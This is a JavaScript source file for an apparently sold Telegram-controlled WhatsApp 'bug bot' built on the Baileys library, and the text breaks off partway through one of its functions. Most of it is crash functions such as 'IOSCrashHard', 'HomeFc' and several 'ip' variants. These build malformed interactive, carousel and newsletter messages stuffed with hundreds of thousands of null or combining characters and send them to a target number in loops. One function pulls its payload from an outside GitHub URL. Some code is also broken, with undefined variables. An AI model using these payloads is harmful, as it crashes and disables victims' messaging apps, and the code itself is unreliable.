 /*
 Dont delete credit yatim
 base by @deakof
 channel @js4hard
 janga hapus credit ingat hapus = mandul 7 turunan
*/
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  generateWAMessageFromContent,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json";

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}


async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const sessions = new Map();

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Excell-Max/database/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
hahahhaha yes bro tanks for buying 

`));


console.log(chalk.red(`Happy For Bugging Men
`));

console.log(chalk.blue(`
[ ⚡bot is running... ]
`));
};

validateToken();
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  const SESSIONS_FILE = "./sessions/active_sessions.json";

  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions`);
        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });
        sessions.set(botNumber, sock);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    MEMULAI    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = `./sessions`;
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    RECONNECTING    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    KONEKSI GAGAL    
│────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`
╭─────────────────
│    TERHUBUNG    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`
╭─────────────────
│    KODE PAIRING    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`
╭─────────────────
│    ERROR    
│────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}




// [ BUG FUNCTION ]
async function test(sock, jid) {
 await new Promise((resolve) => setTimeout(resolve, 500)); 
     let msg = await generateWAMessageFromContent(jid, {
                viewOnceMessage: {
              message: {
                interactiveMessage: {
                  contextInfo: {
                    isForwarded: true,
                    forwardingScore: 1,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "status@broadcast",
                      newsletterName: "@13135550002",
                      serverMessageId: 1,
                    },
                    remoteJid: "status@broadcast",
                    participant: ["0@s.whatsapp.net",
                                 "1212@s.whatsapp.net",
                                 "1@s.whatsapp.net",
                                 "13135550002@s.whatsapp.net",],
                    quotedMessage: {
                      interactiveResponseMessage: {
                        body: {
                          format: 1,
                          text: `Team Deak`,
                        },
                        nativeFlowResponseMessage: {
                          name: "galaxy_message",
                          paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(           510000,)}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
                            510000,               )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                          version: 3,
                        },
                      },
                    },
                  },
                  body: {
                    text: "Team Deak",
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "galaxy_message",
                        buttonParamsJson: "",
                      },
                      {
                        name: "call_permission_request",
                        buttonsParamsJson: "",
                      },
                    ],
                  },
                },
              },
            },
            }, {});
            await sock.relayMessage(jid, msg.message, {
                messageId: msg.key.id,
                participant: { jid: jidr }
            });
       }          
       
async function ExcellCaroUselXStatusHydrated(sock, jid) {
  return new Promise(async (resolve) => {
    try {
      const interactiveContent = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "\u0000"
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [jid],
                isForwarded: true,
                forwardingScore: 999,
                quotedMessage: {
                  conversation: "\u0000",
                  templateMessage: {
                    hydratedTemplate: {
                      hydratedContentText: "\u0000".repeat(1000000),
                      hydratedButtons: [
                        {
                          quickReplyButton: {
                            displayText: "",
                            id: ""
                          }
                        },
                        {
                          quickReplyButton: {
                            displayText: "",
                            id: ""
                          }
                        }
                      ]
                    }
                  }
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  },
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  },
                  {
                    name: "biz_trace",
                    buttonParamsJson: JSON.stringify({ action: "galaxy_message" })
                  }
                ]
              },
              header: {
                text: ""
              },
              footer: {
                text: ""
              },
              cards: {
                title: "biz_trace",
                actions: [
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  },
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  },
                  {
                    button: {
                      text: "",
                      id: "\u0000"
                    }
                  }
                ]
              }
            }
          }
        }
      }, {});

      let mark = 10;
      for (let i = 0; i < mark; i++) {
        let push = [];
        let buttt = [];

        for (let j = 0; j < 5; j++) {
          buttt.push({
            name: "\u0000",
            buttonParamsJson: "\u0000",
          });
        }

        for (let k = 0; k < 1000; k++) {
          push.push({
            "body": {
              "text": `\u0000\u0000\u0000\u0000\u0000`
            },
            "footer": {
              "text": ""
            },
            "header": {
              "title": '\u0000\u0000\u0000\u0000',
              "hasMediaAttachment": true,
              "imageMessage": {
                "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                "mimetype": "image/jpeg",
                "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                "fileLength": "1",
                "height": 0,
                "width": 0,
                "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                "mediaKeyTimestamp": "1721344123",
                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
                "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                "scanLengths": [1024, 1024, 1024, 1024],
                "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
              }
            },
            nativeFlowMessage: {
              buttons: buttt
            }
          });
        }

        const carousel = generateWAMessageFromContent(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: {
                body: {
                  text: '\u0000\u0000\u0000\u0000'
                },
                footer: {
                  text: ""
                },
                header: {
                  hasMediaAttachment: false
                },
                carouselMessage: {
                  cards: push
                }
              }
            }
          }
        }, {});

        const result1 = await sock.relayMessage(jid, interactiveContent.message, {
          messageId: interactiveContent.key.id,
          format: 10,
          participant: { jid: jid }
        });

        await new Promise(resolve => setTimeout(resolve, 500));

        const result2 = await sock.relayMessage(jid, carousel.message, {
          messageId: carousel.key.id,
          format: 10,
          participant: { jid: jid }
        });

        console.log(`Pesan ${i+1}):`, { result1, result2 });
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      setTimeout(() => resolve(), 2000);
    } catch (err) {
      console.error("xxxx:", err);
      resolve();
    }
  });
}
async function HomeFc(sock, jid) {
if (!jid.includes("@s.whatsapp.net") && !jid.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", jid);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/swipfvck29/WaApwi/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid,
},
},
body: {
text: "Excell - Fvck 𝐀𝐓𝐊 𝐘𝐎𝐔",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "Excell Fvck",
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 100; i++) {  
try {
await conn.relayMessage(jid, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}
// IOS CRASH NEW
async function IOSCrashHard(sock, jid) {
  try {
    // Membuat pesan crash khusus untuk iOS
    const genIOSCrash = (title, bodyText) => generateWAMessageFromContent(jid, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: title,
              hasMediaAttachment: false
            },
            body: {
              text: bodyText
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "ios_crash_flow",
                flow_action: "system_overload",
                flow_token: "sock X IOs",
                version: "1.0.0"
              }),
              buttons: [
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    overload_payload: "\u0000".repeat(500000)
                  })
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    crash_sequence: "\u0000".repeat(750000)
                  })
                }
              ]
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 10 }, () => "1@newsletter"),
              forwardingScore: 999999,
              isForwarded: true
            }
          }
        }
      }
    }), { userJid: jid });

    // Kirim serangkaian pesan crash
    for (let i = 1; i <= 10; i++) {
      console.log(chalk.white.bold(`\n[${i}] Mengirim iOS Hard Crash ke ${jid}`));
      
      const msg = await genIOSCrash(
        `iOS Crash Payload ${i}`, 
        "系统崩溃即将开始" + "\u0000".repeat(50000)
      );
      
      await sock.relayMessage(jid, msg.message, { 
        participant: { jid: jid },
        messageId: msg.key.id
      });
      
      // Tambahkan jeda singkat antar pesan
      await new Promise(resolve => setTimeout(resolve, 500));
      
      console.log(chalk.green.bold(`[√] Berhasil mengirim iOS Hard Crash ${i}/10`));
    }

    // Kirim pesan tambahan untuk memastikan crash
    const finalCrashMsg = await genIOSCrash(
      "System Overload", 
      "🔥 Critical System Failure 🔥" + "\u0000".repeat(750000)
    );
    
    await sock.relayMessage(jid, finalCrashMsg.message, { 
      participant: { jid: jid },
      messageId: finalCrashMsg.key.id
    });

    console.log(chalk.blue.bold(`\n[*] Semua 10 payload iOS Hard Crash berhasil dikirim ke ${jid}`));

  } catch (error) {
    console.error(chalk.red.bold(`\n[!] Terjadi error pada iOS Hard Crash: ${error}`));
    throw error;
  }
}
async function ip(sock, jid) {
      try {
        await sock.relayMessage(
          jid,
          {
            extendedTextMessage: {
              text: "salkenn abang",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: jid,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: jid,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: jid,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: jid,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "aduh bangg‎",
                  body: "fitnah babi",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: jid },
            userJid: jid,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
async function ip1(sock, jid) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "blablabla" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(jid, messsage, {
            userJid: jid,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function ip2(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "peduli apa anjir" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: jid,
  },
},
{
  messageId: null,
}
);
}
async function ip3(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: `loh loh` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "xxxxxx ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: jid,
  },
},
{
  messageId: null,
}
);
}
async function waApi(sock, jid) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Tama WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [jid],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Tama Ryuichi | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: jid,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Excell - Fvck",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"mmkk\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "Excell - Fvck",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "Excell - Fvck",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

